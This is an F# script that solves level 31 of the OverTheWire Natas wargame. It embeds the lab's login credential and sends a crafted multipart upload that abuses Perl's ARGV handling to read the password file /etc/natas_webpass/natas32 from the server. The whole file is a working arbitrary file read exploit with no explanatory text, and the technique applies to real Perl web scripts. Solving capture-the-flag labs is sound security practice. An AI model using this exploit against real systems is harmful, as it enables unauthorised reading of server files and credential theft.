open System
open System.Net
open System.IO

let url = "http://natas31.natas.labs.overthewire.org/"
let credentials = "natas31:hay7aecuungiuKaezuathuk9biin0pu1"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let oracle file =

    let boundary = "-----------------------------191691572411478"
    let body = 
        [
            "--" + boundary
            "Content-Disposition: form-data; name=\"file\""
            "Content-Type: text/plain"
            ""
            "ARGV"
            "--" + boundary
            "Content-Disposition: form-data; name=\"file\"; filename=\"test.csv\""
            "Content-Type: text/csv"
            ""
            "test1,test2"
            "--" + boundary
            "Content-Disposition: form-data; name=\"submit\""
            ""
            "Upload"
            "--" + boundary + "--"
        ] |> String.concat "\r\n"
    let bytes = body |> Seq.map byte |> Seq.toArray
    let encodedQuery = WebUtility.UrlEncode(file)
    let fullUrl = sprintf "%sindex.pl?%s" url encodedQuery

    let http = HttpWebRequest.CreateHttp (fullUrl)
    http.Method <- "POST"
    http.ContentType <- "multipart/form-data; boundary=" + boundary

    http.Headers.Add(basicAuth)
    http.Headers.Add(sprintf "Content-Length: %i" bytes.Length)

    let request = http.GetRequestStream()
    request.Write(bytes, 0, bytes.Length)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    reader.ReadToEnd ()

oracle "/etc/natas_webpass/natas32"
|> fun s -> s.[s.IndexOf("<h1>natas31</h1>")..]
|> printfn "%s"